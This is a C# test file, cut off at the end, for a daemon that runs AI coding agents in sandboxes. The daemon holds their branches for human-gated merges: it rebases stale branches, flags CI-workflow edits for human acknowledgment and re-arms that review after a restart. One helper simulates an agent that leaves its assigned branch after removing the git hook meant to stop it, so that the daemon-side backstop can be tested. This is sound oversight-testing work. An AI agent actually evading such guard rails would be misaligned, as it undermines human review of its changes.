    /// The agent moves off its own branch and commits there.
    ///
    /// <para>Driven through LibGit2Sharp, which does not execute git hooks at all — so this reproduces a
    /// jail with no in-jail guard rail, which is every jail that existed before this change (including the
    /// one the defect was reported from) and any jail whose agent removed the hook. That is the right
    /// substrate for a test of the daemon-side backstop: it must not be able to pass merely because the
    /// guard rail happened to stop the agent first. The guard rail itself is exercised against a real
    /// <c>git</c> CLI in <c>AgentBranchGuardTests</c>.</para>
    /// </summary>
    private static void StrandWorkOffTheAgentBranch(string worktree)
    {
        using (var repo = new Repository(worktree))
        {
            Commands.Checkout(repo, repo.CreateBranch("stranded-work"));
        }

        WriteAndCommit(worktree, "subtract.cs", "public static int Subtract(int a, int b) => a - b;\n",
            "Add subtract function");
    }

    // ---- P2-09 keep-alive rebase, wired into the stale cascade -----------
    //
    // THE defect these cover: `git merge --ff-only` is the merge, so the moment any agent merges, every
    // co-tenant branch stops being a fast-forward of main. The cascade staled them and then only
    // RE-VERIFIED them — which passes, against work nothing had rebased — so each entry returned to
    // Verified and its merge was then refused as stale, forever. Only one agent per repository could ever
    // merge, and no daemon-side action existed that could change that.
    //
    // Both of the first two tests assert mergeability in two independent ways, because the failure is
    // precisely that the two used to disagree: CanMerge says the queue believes it, and the ancestry probe
    // says git would actually perform it. A fix that satisfies only the first IS the bug.

    [Fact]
    public async Task AfterOneAgentMerges_TheCoTenantIsRebasedOntoTheNewMain_AndCanActuallyMerge()
    {
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranchFor(repoHash, FirstAgent, "first.cs");
        CommitOnAgentBranchFor(repoHash, SecondAgent, "second.cs");

        var provisioner = NewRebasingProvisioner(out var engine, jailFor: _ => ContainerId);
        Assert.True(provisioner.ReparentsStaleBranches);
        var ctx = provisioner.EnsureQueue(repoHash)!;

        await ctx.Queue.RunVerificationAsync(FirstAgent, CancellationToken.None);
        await ctx.Queue.RunVerificationAsync(SecondAgent, CancellationToken.None);
        Assert.True(ctx.Queue.CanMerge(SecondAgent, out _));

        // The human merges the first agent. Main advances to a commit the second agent's branch does not
        // descend from — which is the whole of the problem, and is true after any --ff-only merge.
        var newMain = FastForwardMainTo(repoHash, "refs/heads/agent/" + FirstAgent);
        Assert.False(FastForwardsOntoMain(repoHash, SecondAgent), "precondition: the co-tenant is behind main");

        ctx.Queue.ConfirmHumanMerge(FirstAgent, newMain);
        await ctx.Queue.LastCascade;

        // (1) The queue believes it can merge...
        Assert.Equal(WorkerMergeState.Verified, ctx.Queue.GetState(SecondAgent));
        Assert.True(ctx.Queue.CanMerge(SecondAgent, out var reason), reason);

        // (2) ...and git agrees, which is the assertion that used to fail. `--ff-only` asks exactly this
        // question, so a branch that passes here is a branch the foreground merge really lands.
        Assert.True(FastForwardsOntoMain(repoHash, SecondAgent),
            "the co-tenant re-verified but was never reparented — its --ff-only merge would still refuse");

        // (3) The rebase went through the P2-09 yield: the jail was frozen for the mutation and thawed
        // afterwards. Rewriting a worktree that is bind-mounted into a RUNNING jail without that is the
        // .git/index.lock collision this application exists to prevent, with the daemon as second writer.
        Assert.Contains("pause:" + ContainerId, engine.FreezeLog);
        Assert.Contains("unpause:" + ContainerId, engine.FreezeLog);
    }

    /// <summary>
    /// The same scenario on the composition this change replaced — re-verify with no rebase — pinned as a
    /// regression rather than described in a comment.
    ///
    /// <para>It is the exact shape of the defect: the entry lands back on <c>Verified</c>,
    /// <c>CanMerge</c> answers TRUE, and the branch does not fast-forward, so the merge refuses with
    /// "verification is stale" and the refusal re-queues it into the same cascade. Every observable the
    /// human has says ready; the one that decides says no.</para>
    /// </summary>
    [Fact]
    public async Task WithoutTheKeepAliveRebase_TheCoTenantLooksMergeableAndIsNot()
    {
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranchFor(repoHash, FirstAgent, "first.cs");
        CommitOnAgentBranchFor(repoHash, SecondAgent, "second.cs");

        // No yield, no worktree locator — i.e. the pre-fix daemon.
        var provisioner = NewProvisioner(exitCode: 0, out _);
        Assert.False(provisioner.ReparentsStaleBranches);
        var ctx = provisioner.EnsureQueue(repoHash)!;

        await ctx.Queue.RunVerificationAsync(FirstAgent, CancellationToken.None);
        await ctx.Queue.RunVerificationAsync(SecondAgent, CancellationToken.None);

        ctx.Queue.ConfirmHumanMerge(FirstAgent, FastForwardMainTo(repoHash, "refs/heads/agent/" + FirstAgent));
        await ctx.Queue.LastCascade;

        Assert.True(ctx.Queue.CanMerge(SecondAgent, out _));       // the queue says yes
        Assert.False(FastForwardsOntoMain(repoHash, SecondAgent));  // git says no
    }

    /// <summary>
    /// Decision: a staled entry whose agent has been STOPPED must not become a second permanent-stuck
    /// state.
    ///
    /// <para>There is nothing to yield and nothing to rebase, and (§3.2) nothing to verify in either — so
    /// the entry returns to <c>Working</c> carrying the missing sandbox as its reason, which is what the
    /// human-only resume path answers. Deliberately NOT routed through <c>RunVerificationAsync</c> to fail
    /// on the no-jail refusal: that reaches the same state through a "verification failed"-shaped event
    /// for a verification that never ran.</para>
    /// </summary>
    [Fact]
    public async Task AStaledEntryWhoseAgentIsGone_ReturnsToWorking_NamingTheMissingJail()
    {
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranchFor(repoHash, FirstAgent, "first.cs");
        CommitOnAgentBranchFor(repoHash, SecondAgent, "second.cs");

        // The second agent's jail disappears after both branches have been verified.
        var stopped = false;
        var provisioner = NewRebasingProvisioner(out _,
            jailFor: agentId => stopped && agentId == SecondAgent ? null : ContainerId);
        var ctx = provisioner.EnsureQueue(repoHash)!;

        await ctx.Queue.RunVerificationAsync(FirstAgent, CancellationToken.None);
        await ctx.Queue.RunVerificationAsync(SecondAgent, CancellationToken.None);
        stopped = true;

        ctx.Queue.ConfirmHumanMerge(FirstAgent, FastForwardMainTo(repoHash, "refs/heads/agent/" + FirstAgent));
        await ctx.Queue.LastCascade;

        // Not stale-forever, not verifying-forever, and emphatically not falsely Verified: Working, with
        // the reason attached.
        Assert.Equal(WorkerMergeState.Working, ctx.Queue.GetState(SecondAgent));
        Assert.False(ctx.Queue.CanMerge(SecondAgent, out var reason));
        Assert.Contains("no live sandbox", reason);
        Assert.Contains("resume the agent", reason);

        // ...and the block is in the audit trail, not only in a log line nobody keeps.
        Assert.Contains(_audit.Read(), e =>
            e.Type == MergeQueue.RequeueBlockedEvent && e.Fields["agent"] == SecondAgent);

        // The entry is not frozen: once the agent is back, an ordinary verification walks it out of
        // Working, and the block reason retires with the state rather than outliving it.
        stopped = false;
        await ctx.Queue.RunVerificationAsync(SecondAgent, CancellationToken.None);
        Assert.Equal(WorkerMergeState.Verified, ctx.Queue.GetState(SecondAgent));
        Assert.True(ctx.Queue.CanMerge(SecondAgent, out _));
    }

    /// <summary>
    /// Decision: a rebase that CONFLICTS must leave the user something to act on, not a parked worktree
    /// nobody surfaces.
    ///
    /// <para>The conflict arm was entirely dead in production — <c>AgentRunState.Conflict</c> had no
    /// writer, <c>ConflictHandoff</c> was constructed nowhere outside tests, and the T-04 resolver it was
    /// meant to reach does not exist yet. So the worktree would have been parked mid-rebase with the jail
    /// paused and <i>nothing anywhere naming it</i>, which is byte-for-byte indistinguishable from an
    /// agent that quietly stopped making progress.</para>
    ///
    /// <para>What this asserts is the three places the conflict now exists outside the background task
    /// that produced it: the agent's run state (streamed to clients by the daemon's supervisor), the audit
    /// trail (carrying the T-04 handoff payload for the resolver when it lands), and the queue entry's own
    /// gate reason. The worktree stays parked — deliberately, no automatic <c>rebase --abort</c> — and the
    /// jail stays paused, which is what the resolver needs; the change is that all of that is now legible.</para>
    /// </summary>
    [Fact]
    public async Task AConflictingRebase_ParksTheWorktree_AndSaysSoInThreePlaces()
    {
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        // Both agents edit the SAME file differently — the rebase cannot replay the second onto the first.
        CommitOnAgentBranchFor(repoHash, FirstAgent, "shared.cs", "public class Shared { int First; }\n");
        CommitOnAgentBranchFor(repoHash, SecondAgent, "shared.cs", "public class Shared { int Second; }\n");

        var states = new List<(string Agent, string State)>();
        var provisioner = NewRebasingProvisioner(out _, jailFor: _ => ContainerId, supervisor: new RecordingSupervisor(states));
        var ctx = provisioner.EnsureQueue(repoHash)!;

        await ctx.Queue.RunVerificationAsync(FirstAgent, CancellationToken.None);
        await ctx.Queue.RunVerificationAsync(SecondAgent, CancellationToken.None);

        ctx.Queue.ConfirmHumanMerge(FirstAgent, FastForwardMainTo(repoHash, "refs/heads/agent/" + FirstAgent));
        await ctx.Queue.LastCascade;

        // (1) The agent's run state — the one the daemon's supervisor streams to clients.
        Assert.Contains(states, s => s.Agent == SecondAgent && s.State == nameof(AgentRunState.Conflict));

        // (2) The audit trail, carrying the T-04 handoff payload (which worktree, which branch).
        var handoff = Assert.Single(_audit.Read(), e =>
            e.Type == MergeQueueProvisioner.KeepAliveConflictEvent && e.Fields["agent"] == SecondAgent);
        Assert.NotEmpty(handoff.Fields["worktree"]);

        // (3) The queue entry itself: not falsely Verified, not stuck at StaleVerified, and its refusal
        // says what happened rather than "not verified yet".
        Assert.Equal(WorkerMergeState.Working, ctx.Queue.GetState(SecondAgent));
        Assert.False(ctx.Queue.CanMerge(SecondAgent, out var reason));
        Assert.Contains("conflict", reason);
        Assert.Contains("resolve", reason);

        // The rebase is LEFT in progress for the resolver — no automatic abort (a rejection trigger).
        var worktree = new WorktreeManager(_vmRoot).WorktreePathFor(repoHash, SecondAgent);
        Assert.True(Directory.Exists(Path.Combine(ResolveGitDir(worktree), "rebase-merge")));
    }

    /// <summary>A linked worktree's <c>.git</c> is a file pointing at the real gitdir.</summary>
    private static string ResolveGitDir(string worktreePath)
    {
        var dotGit = Path.Combine(worktreePath, ".git");
        if (Directory.Exists(dotGit))
        {
            return dotGit;
        }

        foreach (var line in File.ReadAllLines(dotGit))
        {
            var trimmed = line.Trim();
            if (trimmed.StartsWith("gitdir:", StringComparison.Ordinal))
            {
                var target = trimmed["gitdir:".Length..].Trim();
                return Path.IsPathRooted(target) ? target : Path.GetFullPath(Path.Combine(worktreePath, target));
            }
        }

        return dotGit;
    }

    // ---- L1: a Verified row plus a daemon restart was a permanent dead end ----
    //
    // Observed live: three Verified rows unmergeable FOREVER after a bounce. FlaggedChangeGate holds its
    // AcknowledgmentStores in memory; ArmFlaggedChangeReview (the only writer) runs solely inside a
    // verification; Verify is withheld from a Verified row (§19.7); and the readiness trigger's eligible
    // set excludes Verified. So the MG-40 default-DENY fired — correctly — and nothing in the product
    // could ever re-arm it. These tests are about the path back, and about the two things it must never
    // become.

    /// <summary>
    /// The dead end, and its exit. A restart re-derives the CLASSIFICATION from the mirror, so the row is
    /// actionable again — and re-derives it ONLY, so the human has to acknowledge every item a second
    /// time before anything can merge.
    /// </summary>
    [Fact]
    public async Task AVerifiedEntry_IsReArmedAfterADaemonRestart_AndStillDemandsEveryAcknowledgment()
    {
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitFlagWorthyWorkOnAgentBranch(repoHash);

        var stores = new SharedStores();

        // ---- daemon lifetime 1: verify green, and the flagged review blocks the merge until acked ----
        var ctx = NewProvisioner(stores, out _).EnsureQueue(repoHash)!;
        Assert.True((await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None)).Passed);
        Assert.Equal(WorkerMergeState.Verified, ctx.Queue.GetState(AgentId));

        var items = ctx.FlaggedChanges!.PeekStore(AgentId)!.Items;
        Assert.NotEmpty(items);
        foreach (var item in items)
        {
            Assert.True(ctx.FlaggedChanges.PeekStore(AgentId)!.Acknowledge(item.Id));
        }

        Assert.True(ctx.Queue.CanMerge(AgentId, out _));

        // ---- the restart. Same DB, brand-new in-memory gate — which is the whole defect. ----
        var restarted = NewProvisioner(stores, out _);
        var ctx2 = restarted.EnsureQueue(repoHash)!;

        // The re-arm changes the gate's ANSWER while moving no state, and a client learns of it only on
        // the queue stream, which re-pushes only on Changed. Without the republish the daemon holds the
        // fix and the human's rail goes on rendering the dead end until some unrelated transition fires.
        var republished = 0;
        ctx2.Queue.Changed += () => Interlocked.Increment(ref republished);

        await restarted.LastRearm;
        Assert.True(republished > 0, "the re-arm changed the gate's answer and never republished the queue");

        // The row is still Verified: the branch did not move, so nothing invalidated its evidence.
        Assert.Equal(WorkerMergeState.Verified, ctx2.Queue.GetState(AgentId));

        // ...and the gate no longer answers the dead-end sentence. Before the re-arm this read
        // "flagged-change review has not run for this branch (no acknowledgment record)" and NOTHING in
        // the product could change it: PeekStore was null, so an acknowledgment was a silent no-op.
        Assert.False(ctx2.Queue.CanMerge(AgentId, out var reason));
        Assert.DoesNotContain("has not run", reason);
        Assert.Contains("acknowledgment", reason);

        // The acknowledgments are NOT restored — every item is pending again. A restart may only ever
        // increase the review a human owes; it can never discharge any of it.
        var rearmed = ctx2.FlaggedChanges!.PeekStore(AgentId);
        Assert.NotNull(rearmed);
        Assert.Equal(items.Count, rearmed!.Items.Count);
        Assert.Equal(rearmed.Items.Count, rearmed.PendingCount);
        Assert.False(rearmed.AllAcknowledged);

        // ...and the item ids are the SAME ids, because they are content-bound and the bytes did not
        // change. That is what makes this a re-derivation of today's diff rather than a restoration of a
        // remembered one: had the branch pushed, the hashes — and therefore the ids — would differ.
        Assert.Equal(
            items.Select(i => i.Id).OrderBy(i => i, StringComparer.Ordinal).ToArray(),
            rearmed.Items.Select(i => i.Id).OrderBy(i => i, StringComparer.Ordinal).ToArray());

        // The exit exists: acknowledging again merges. This is the assertion the live defect could not
        // satisfy by any sequence of actions whatsoever.
        foreach (var item in rearmed.Items)
        {
            Assert.True(rearmed.Acknowledge(item.Id));
        }

        Assert.True(ctx2.Queue.CanMerge(AgentId, out _));
    }

    /// <summary>
    /// The safety guard, and the reason the pass primes the branch tip BEFORE it arms anything: a branch
    /// that moved while the daemon was down must not be re-armed as a mergeable row.
    ///
    /// <para>This is the case no observation can catch. <c>AgentRefWatcher</c> only sweeps agents it was
    /// told to <c>Watch</c>, i.e. agents with a live sandbox, so a stopped agent whose branch advanced
    /// during the outage is announced by nothing — and <c>_branchTip</c> is deliberately not persisted
    /// (§19.7). The durable half of the compare is the record's own <c>BranchSha</c> (J1): the pass asks
    /// the mirror what the tree is NOW and lets <c>NotifyBranchAdvanced</c> compare it against what the
    /// evidence says it measured.</para>
    /// </summary>
    [Fact]
    public async Task ABranchThatMovedWhileTheDaemonWasDown_IsWalkedToWorking_AndNeverReArmedAsMergeable()
    {
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");

        var stores = new SharedStores();
        var ctx = NewProvisioner(stores, out _).EnsureQueue(repoHash)!;
        Assert.True((await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None)).Passed);
        Assert.Equal(WorkerMergeState.Verified, ctx.Queue.GetState(AgentId));
        Assert.True(ctx.Queue.CanMerge(AgentId, out _));

        // ...the daemon goes down, and the agent commits. Published into the mirror the way the daemon's
        // own mediator would have, because the point is that NOBODY was watching when it happened.
        var worktree = new WorktreeManager(_vmRoot).WorktreePathFor(repoHash, AgentId);
        WriteAndCommit(worktree, "second.cs", "public class Second { }\n", "work the daemon never saw");
        new WorktreeManager(_vmRoot).PublishAgentBranch(repoHash, AgentId);

        var restarted = NewProvisioner(stores, out _);
        var ctx2 = restarted.EnsureQueue(repoHash)!;
        await restarted.LastRearm;

        // Working, not Verified — and said in the branch's own words rather than "not verified yet".
        Assert.Equal(WorkerMergeState.Working, ctx2.Queue.GetState(AgentId));
        Assert.False(ctx2.Queue.CanMerge(AgentId, out var reason));
        Assert.Equal(MergeQueue.BranchMovedReason, reason);

        // ...and the re-arm did NOT then hand this entry a flagged-change store, because a row that
        // cannot merge is not the dead end this pass exists to open.
        Assert.Null(ctx2.FlaggedChanges!.PeekStore(AgentId));
    }

    /// <summary>
    /// The invariant behind the pass's scope: the states it re-arms are exactly the states
    /// <see cref="MergeQueue.CanMerge"/> admits. A state that can merge and is not covered here is a dead
    /// end again; a state that is covered and cannot merge is a mirror read for nothing.
    ///
    /// <para>Asserted over the whole enum rather than the two names, so adding a tenth state cannot
    /// quietly reopen the defect.</para>
    /// </summary>
    [Theory]
    [InlineData(WorkerMergeState.Working)]
    [InlineData(WorkerMergeState.Verifying)]
    [InlineData(WorkerMergeState.Verified)]
    [InlineData(WorkerMergeState.StaleVerified)]
    [InlineData(WorkerMergeState.VerificationFailed)]
    [InlineData(WorkerMergeState.AwaitingReview)]
    [InlineData(WorkerMergeState.Merged)]
    [InlineData(WorkerMergeState.Rejected)]
    [InlineData(WorkerMergeState.Discarded)]
    public void EveryStateThatCanMerge_IsAStateTheRestartRearmCovers(WorkerMergeState state)
    {
        var admitsAMerge = state is WorkerMergeState.Verified or WorkerMergeState.AwaitingReview;
        Assert.Equal(admitsAMerge, MergeQueueProvisioner.RearmableStates.Contains(state));
    }

    // ---- L3: the dead-agent rows reported the opposite of the truth ------
    //
    // After a merge moved main, three rows whose agents had been stopped were walked to Working. The
    // daemon logged "this branch needs rebasing onto the new main and its agent has no live sandbox —
    // resume the agent"; the UI said "Not verified yet — no test run has been recorded for this branch",
    // about rows each holding a PASSING VerificationRow. Two independent losses, both here.

    /// <summary>
    /// L3(a): the honest reason survives the jail reconciler. <c>CanMerge</c> ordered its generic
    /// <see cref="MergeQueue.StrandedReason"/> ahead of every measured reason, so the one branch of the
    /// cascade that had actually established the missing sandbox had its sentence — the strictly more
    /// informative one — replaced by a restatement of half of it.
    ///
    /// <para>L3(b): the passing verification record survives the block. The cascade cleared it, so the
    /// verification panel reported "no test run has been recorded for this branch" about a branch whose
    /// tests had passed. The bytes did not change — only the parentage — which is precisely the
    /// <c>StaleVerified</c> case, and <c>StaleVerified</c> keeps its record.</para>
    /// </summary>
    [Fact]
    public async Task AStrandedEntryTheCascadeCouldNotReparent_KeepsTheDaemonsOwnReason_AndItsPassingRecord()
    {
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranchFor(repoHash, FirstAgent, "first.cs");
        CommitOnAgentBranchFor(repoHash, SecondAgent, "second.cs");

        var stopped = false;
        var ctx = NewRebasingProvisioner(out _,
            jailFor: agentId => stopped && agentId == SecondAgent ? null : ContainerId).EnsureQueue(repoHash)!;

        await ctx.Queue.RunVerificationAsync(FirstAgent, CancellationToken.None);
        var green = await ctx.Queue.RunVerificationAsync(SecondAgent, CancellationToken.None);
        Assert.True(green.Passed);
        stopped = true;

        ctx.Queue.ConfirmHumanMerge(FirstAgent, FastForwardMainTo(repoHash, "refs/heads/agent/" + FirstAgent));
        await ctx.Queue.LastCascade;

        // The daemon's own liveness pass runs in production and is what marks the entry stranded — the
        // step the earlier no-jail test omits, and therefore the step under which the reason was lost.
        var report = ctx.Queue.ReconcileJails(agentId => !(stopped && agentId == SecondAgent));
        Assert.Contains(SecondAgent, report.Stranded);

        Assert.Equal(WorkerMergeState.Working, ctx.Queue.GetState(SecondAgent));
        Assert.False(ctx.Queue.CanMerge(SecondAgent, out var reason));

        // L3(a): verbatim, exactly as MergeQueueProvisioner.Block's comment has always claimed.
        Assert.Equal(MergeQueueProvisioner.NoLiveSandboxReason, reason);
        Assert.NotEqual(MergeQueue.StrandedReason, reason);

        // L3(b): the passing run is still readable. This is the record the verification panel renders,
        // and it is the one the DB row's LastVerificationId has pointed at all along.
        var record = ctx.Queue.LastVerification(SecondAgent);
        Assert.NotNull(record);
        Assert.True(record!.Passed);
        Assert.Equal(green.When, record.When);

        // ...and keeping it cannot grant a merge: the entry is at Working, which CanMerge never admits,
        // and the only non-terminal edge out of Working is Verifying, whose settle overwrites the record.
        Assert.False(ctx.Queue.CanMerge(SecondAgent, out _));
    }

    /// <summary>
    /// The other half of the precedence, and the reason it is a per-reason flag rather than a blanket
    /// reorder: a reason measured with a LIVE jail in hand must NOT outlive the jail it assumed. A
    /// stranded entry whose branch merely moved is told its sandbox is gone — not told to go and resolve
    /// a rebase inside a container that no longer exists.
    /// </summary>
    [Fact]
    public async Task AStrandedEntryWhoseReasonAssumedALiveJail_StillGetsTheStrandedSentence()
    {
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");

        var live = true;
        var ctx = NewRebasingProvisioner(out _, jailFor: _ => live ? ContainerId : null).EnsureQueue(repoHash)!;
        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);
        Assert.Equal(WorkerMergeState.Verified, ctx.Queue.GetState(AgentId));

        // A branch-tip move: measured from the mirror, with nothing asked about the jail.
        Assert.True(ctx.Queue.NotifyBranchAdvanced(AgentId, "0000000000000000000000000000000000000001"));
        Assert.False(ctx.Queue.CanMerge(AgentId, out var beforeStranding));
        Assert.Equal(MergeQueue.BranchMovedReason, beforeStranding);

        // ...and now the sandbox goes. "re-verifying" is a promise that needs a jail, so the newer,
        // re-measured fact wins.
        live = false;
        Assert.Contains(AgentId, ctx.Queue.ReconcileJails(_ => false).Stranded);
        Assert.False(ctx.Queue.CanMerge(AgentId, out var afterStranding));
        Assert.Equal(MergeQueue.StrandedReason, afterStranding);
    }

    /// <summary>Lands work on a path the P2-11 classifier flags (a CI workflow runs with repo
    /// credentials), so the flagged-change gate has something real to hold.</summary>
    private void CommitFlagWorthyWorkOnAgentBranch(string repoHash)
    {
        var worktree = new WorktreeManager(_vmRoot).CreateAgentWorktree(repoHash, AgentId);
        WriteAndCommit(worktree, ".github/workflows/ci.yml",
            "name: ci\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n",
            "the agent edits a CI workflow");
    }

    /// <summary>The two stores a daemon restart does NOT lose — the SQLite-backed pair, shared across two
    /// provisioners so the second one is a genuine restart rather than a second, empty daemon.</summary>
    private sealed class SharedStores
    {
        public InMemoryMergeQueueStore Queue { get; } = new();

        public InMemoryVerificationStore Verifications { get; } = new();
    }

    /// <summary>A provisioner over pre-existing persisted state — the restart harness.</summary>
    private MergeQueueProvisioner NewProvisioner(SharedStores stores, out FakeSandboxEngine engine)
    {
        engine = new FakeSandboxEngine(0, null);
        return new MergeQueueProvisioner(
            registry: new MergeQueueRegistry(),
            repos: new RepoProvisioner(_vmRoot),
            leases: new InMemoryMergeLeaseStore(),
            resolveContainerId: (_, _) => ContainerId,
            queueStore: _ => stores.Queue,
            verificationStore: _ => stores.Verifications,
            sandboxes: engine,
            artifactDirectory: NewDir("mainguard-mqprov-artifacts-"),
            mergeDiff: new MergeBranchDiffService(
                new RepoProvisioner(_vmRoot),
                (repoHash, agentId) => new WorktreeManager(_vmRoot).PublishAgentBranch(repoHash, agentId)),
            audit: _audit,
            publishAgentRef: (repoHash, agentId) => new WorktreeManager(_vmRoot).PublishAgentBranch(repoHash, agentId),
            checkAgentBranch: (repoHash, agentId) => new WorktreeManager(_vmRoot).CheckAgentBranch(repoHash, agentId));
    }

    // ---- harness ---------------------------------------------------------

    /// <summary>
    /// A provisioner composed the way the daemon composes one: with the P2-09 yield and a real worktree
    /// locator, so its queues REPARENT a staled branch instead of only re-running its tests.
    /// </summary>
    /// <param name="jailFor">agentId → its live jail, or null when the agent has been stopped.</param>
    private MergeQueueProvisioner NewRebasingProvisioner(
        out FakeSandboxEngine engine, Func<string, string?> jailFor,
        RecordingSupervisor? supervisor = null, int exitCode = 0)
    {
        var sandbox = new FakeSandboxEngine(exitCode);
        engine = sandbox;
        var vmRoot = _vmRoot;
        return new MergeQueueProvisioner(
            registry: new MergeQueueRegistry(),
            repos: new RepoProvisioner(vmRoot),
            leases: new InMemoryMergeLeaseStore(),
            resolveContainerId: (_, agentId) => jailFor(agentId),
            queueStore: _ => new InMemoryMergeQueueStore(),
            verificationStore: _ => new InMemoryVerificationStore(),
            sandboxes: sandbox,
            artifactDirectory: NewDir("mainguard-mqprov-artifacts-"),
            mergeDiff: new MergeBranchDiffService(
                new RepoProvisioner(vmRoot),
                (repoHash, agentId) => new WorktreeManager(vmRoot).PublishAgentBranch(repoHash, agentId)),
            audit: _audit,
            publishAgentRef: (repoHash, agentId) => new WorktreeManager(vmRoot).PublishAgentBranch(repoHash, agentId),
            checkAgentBranch: (repoHash, agentId) => new WorktreeManager(vmRoot).CheckAgentBranch(repoHash, agentId),
            // The two arguments whose absence WAS the defect. UnboundAgentControlChannel is the daemon's
            // own channel: no cooperative transport exists, so every yield takes the pause path — which is
            // the path a test wants exercised anyway, since it is the one production takes.
            yieldProtocolFor: _ => new YieldProtocol(
                channelFor: _ => UnboundAgentControlChannel.Instance,
                sandbox: sandbox,
                containerIdFor: jailFor),
            locateAgentWorktree: (repoHash, agentId) => new WorktreeManager(vmRoot).WorktreePathFor(repoHash, agentId),
            publishRebasedAgentRef: (repoHash, agentId) =>
                new WorktreeManager(vmRoot).PublishRebasedAgentBranch(repoHash, agentId),
            agentStates: supervisor);
    }

    /// <summary>Lands the agent's work on the agent branch, exactly as <see cref="CommitOnAgentBranch"/>
    /// does, for the multi-agent tests that need more than one id.</summary>
    private void CommitOnAgentBranchFor(string repoHash, string agentId, string fileName, string? content = null)
    {
        var worktree = new WorktreeManager(_vmRoot).CreateAgentWorktree(repoHash, agentId);
        WriteAndCommit(worktree, fileName,
            content ?? $"public class {Path.GetFileNameWithoutExtension(fileName)} {{ }}\n",
            $"{agentId}'s actual work");
    }

    /// <summary>Records every state the daemon reflects on an agent — the keep-alive cycle's run states
    /// and the merge queue's own, which are the two things a coordinator's <c>get_worker_status</c> can
    /// see. The reason is kept because it is what a human reads.</summary>
    private sealed class RecordingSupervisor : IAgentSupervisor
    {
        private readonly List<(string Agent, string State)> _states;

        public RecordingSupervisor(List<(string Agent, string State)>? states = null)
            => _states = states ?? new List<(string Agent, string State)>();

        /// <summary>Every mark, with its reason, in order.</summary>
        public List<(string Agent, string State, string? Reason)> Marks { get; } = new();

        public void PauseInput(string agentId) { }

        public void ResumeInput(string agentId) { }

        public void MarkState(string agentId, string state, string? reason)
        {
            lock (_states)
            {
                _states.Add((agentId, state));
                Marks.Add((agentId, state, reason));
            }
        }
    }

    /// <summary>
    /// The record the provisioner writes is pinned to the mirror's <b>real</b> <c>agent/&lt;id&gt;</c> tip,
    /// and to the tip AFTER the pre-verification publish — not to whatever the mirror held before.
    ///
    /// <para>This is the fact the whole freeze fix rests on, and it is the one part of it that cannot be
    /// asserted anywhere but here, against real git: everything downstream — the invalidation, the
    /// mid-run demotion, the merge gate's branch-side compare — reads
    /// <c>VerificationRecord.BranchSha</c>, and all of it is inert if this method hands back an empty
    /// string or a stale sha. The record already pinned <c>main@sha</c> this way; the branch side was
    /// simply never recorded, which is why the queue could not ask whether the tree it verified still
    /// existed.</para>
    /// </summary>
    [Fact]
    public async Task TheVerificationRecord_IsPinnedToTheMirrorsRealAgentBranchTip()
    {
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");

        var ctx = NewProvisioner(exitCode: 0, out _).EnsureQueue(repoHash)!;
        var first = await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.Equal(MirrorTip(repoHash, AgentId), first.BranchSha);
        Assert.NotEqual(first.MainSha, first.BranchSha);

        // …and a SECOND run after the agent commits again is pinned to the new tip. The publish that
        // carries that commit into the mirror happens inside this same call, so a record built before it
        // would silently name the previous tree — the freeze, one layer down.
        var worktree = new WorktreeManager(_vmRoot).WorktreePathFor(repoHash, AgentId);
        WriteAndCommit(worktree, "second.cs", "public class Second { }\n", "more work");

        ctx.Queue.NotifyNewCommits(AgentId);
        var second = await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.NotEqual(first.BranchSha, second.BranchSha);
        Assert.Equal(MirrorTip(repoHash, AgentId), second.BranchSha);
    }

    /// <summary>The mirror's current <c>refs/heads/agent/&lt;id&gt;</c> — the ref the merge consumes.</summary>
    private string MirrorTip(string repoHash, string agentId)
    {
        using var mirror = new Repository(new RepoProvisioner(_vmRoot).BareRepoPathFor(repoHash));
        var branch = mirror.Refs["refs/heads/agent/" + agentId]
            ?? throw new InvalidOperationException("the mirror has no branch for " + agentId);
        return branch.ResolveToDirectReference().TargetIdentifier;
    }

    /// <summary>
    /// Advances the mirror's main to <paramref name="reference"/> and returns the new sha — the mirror-side
    /// result of a human <c>git merge --ff-only agent/&lt;id&gt;</c> on their own checkout.
    ///
    /// <para>A ref update rather than a merge commit on purpose: <c>--ff-only</c> produces exactly this,
    /// and the property under test is what a fast-forward does to everyone ELSE's branch.</para>
    /// </summary>
    private string FastForwardMainTo(string repoHash, string reference)
    {
        using var mirror = new Repository(new RepoProvisioner(_vmRoot).BareRepoPathFor(repoHash));
        var target = mirror.Refs[reference] ?? throw new InvalidOperationException($"missing ref {reference}");
        var sha = mirror.Lookup<Commit>(target.ResolveToDirectReference().TargetIdentifier).Sha;
        mirror.Refs.UpdateTarget(mirror.Refs[mirror.Head.CanonicalName], new ObjectId(sha));
        return sha;
    }

    /// <summary>
    /// The question <c>git merge --ff-only</c> asks: is the mirror's main an ancestor of this agent's
    /// branch — i.e. would the human's merge actually land?
    ///
    /// <para>Read off the MIRROR, because that is the ref the merge consumes and the ref the
    /// pre-verification publish carries the agent's tip into. Asking the agent's own repository instead
    /// would answer about bytes the merge never sees.</para>
    /// </summary>
    private bool FastForwardsOntoMain(string repoHash, string agentId)
    {
        new WorktreeManager(_vmRoot).PublishAgentBranch(repoHash, agentId);
        using var mirror = new Repository(new RepoProvisioner(_vmRoot).BareRepoPathFor(repoHash));
        var main = mirror.Head.Tip;
        var branch = mirror.Refs["refs/heads/agent/" + agentId];
        if (branch is null)
        {
            return false;
        }

        var tip = mirror.Lookup<Commit>(branch.ResolveToDirectReference().TargetIdentifier);
